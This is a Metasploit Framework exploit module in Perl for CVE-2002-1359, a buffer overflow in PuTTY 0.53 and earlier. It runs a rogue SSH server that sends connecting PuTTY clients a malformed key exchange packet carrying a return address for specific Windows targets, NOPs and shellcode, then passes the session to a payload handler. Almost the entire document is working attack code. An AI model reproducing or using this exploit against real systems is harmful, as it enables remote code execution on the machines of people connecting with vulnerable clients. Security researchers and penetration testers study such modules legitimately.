PuTTy.exe <= 0.53 (validation) Remote Buffer Overflow Exploit (meta)
====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::putty_ssh;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	&#039;Name&#039;           => &#039;PuTTy.exe <= v0.53 Buffer Overflow&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;        => [ &#039;y0 [at] w00t-shell.net&#039; ],
	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in the PuTTY SSH client that is triggered
		through a validation error in SSH.c.
}),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;win32&#039;, &#039;winxp&#039;, &#039;win2000&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;SSHDPORT&#039;   => [ 1, &#039;PORT&#039;, &#039;The local SSHD listener port&#039;,  22         ],
		&#039;SSHSERVER&#039;  =>  [ 1, &#039;HOST&#039;, &#039;The local SSHD listener host&#039;, "0.0.0.0"  ],
	  },

	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;process&#039; },

	&#039;Payload&#039;      =>
	  {
		&#039;Space&#039;    => 400,
		&#039;BadChars&#039; => "\x00",
		&#039;Prepend&#039;  => "\x81\xc4\xff\xef\xff\xff\x44",
		&#039;MaxNops&#039;  => 0,
		&#039;Keys&#039;     => [ &#039;-ws2ord&#039;, &#039;-bind&#039; ],
	  },

	&#039;Refs&#039;            =>
	  [
		[ &#039;URL&#039;, &#039;http://www.rapid7.com/advisories/R7-0009.html&#039; ],
		[ &#039;CVE&#039;, &#039;2002-1359&#039; ],

	  ],

	&#039;DefaultTarget&#039;  => 0,

	&#039;Targets&#039;        =>
	  [
		[ &#039;Windows 2000 SP4 English&#039;,   0x77e14c29 ],
		[ &#039;Windows XP SP2 English&#039;,     0x76b43ae0 ],
		[ &#039;Windows 2003 SP1 English&#039;,   0x76AA679b ],
	  ],

	&#039;Keys&#039;           => [ &#039;putty&#039; ],

	&#039;DisclosureDate&#039; => &#039;December 16 2002&#039;,
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			&#039;Info&#039;     => $info,
			&#039;Advanced&#039; => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;SSHSERVER&#039;),
		LocalPort => $self->GetVar(&#039;SSHDPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;);
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local SSHD listener on " . $self->GetVar(&#039;SSHDPORT&#039;));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar(&#039;SSHSERVER&#039;) . ":" . $self->GetVar(&#039;SSHDPORT&#039;) . "...");

	while (defined($client = $server->accept()))
	{
		$self->HandlePuttyClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandlePuttyClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $target    = $self->Targets->[$self->GetVar(&#039;TARGET&#039;)];
	my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	my $sploit =
	  "SSH-2.0-OpenSSH_3.6.1p2\r\n".
	  "\x00\x00\x4e\xec\x01\x14".
	  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
	  "\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde".
	  (((((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde") x 2).
	  (((Pex::Text::AlphaNumText(64)). ",") x 2). Pex::Text::AlphaNumText(21).
	  pack(&#039;V&#039;, $target->[1]). $self->MakeNops(10). $shellcode.
	  (((Pex::Text::AlphaNumText(64)). ",") x 15). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((Pex::Text::AlphaNumText(64)). ",") x 21). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde") x 6).
	  "\x00\x00\x00\x00\x00\x00";

	$self->PrintLine("[*] Client connected from $rhost:$rport...");

	$fd->Send($sploit);

	$self->PrintLine("[*] Sending ". length($sploit). " bytes to remote host...");

	$self->Handler($fd);

	$fd->Close();
}

1;


